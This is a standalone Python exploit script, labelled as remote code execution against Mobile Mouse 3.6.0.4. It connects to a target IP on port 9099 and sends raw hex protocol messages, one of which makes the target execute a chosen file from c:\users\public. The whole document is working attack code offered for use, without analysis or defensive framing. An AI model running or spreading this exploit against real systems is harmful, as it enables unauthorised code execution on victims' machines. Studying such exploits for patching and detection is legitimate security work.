import socket
from time import sleep
import argparse

def connect_to_target(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def send_and_receive(s, data_hex):
    data = bytearray.fromhex(data_hex)
    s.send(data)
    response = s.recv(54)  # Adjust the buffer size as needed
    return response

def execute_command_shell(s, command_shell):
    run_command = f'c:\\users\\public\\{command_shell}'.encode('utf-8')
    hex_run = ''.join(format(x, '02x') for x in run_command)
    command_hex = "4B45591E3130301E" + hex_run + "1E04" + "4b45591e2d311e454e5445521e04"
    return send_and_receive(s, command_hex)

def main():
    help_text = "Execute Script - Mobile Mouse 3.6.0.4 Remote Code Execution"
    parser = argparse.ArgumentParser(description=help_text)
    parser.add_argument("--target", help="Target IP", required=True)
    parser.add_argument("--file", help="File name to Execute")
    args = parser.parse_args()

    host = args.target
    command_shell = args.file
    port = 9099  # Default Port

    s = connect_to_target(host, port)

    # Run command again
    response = send_and_receive(s, "4b45591e3131341e721e4f505404")
    print(response.decode())

    sleep(10)

    # Execute command shell
    response = execute_command_shell(s, command_shell)
    print(response.decode())

    print("Command Shell Executed Successfully")

    s.close()

if __name__ == "__main__":
    main()
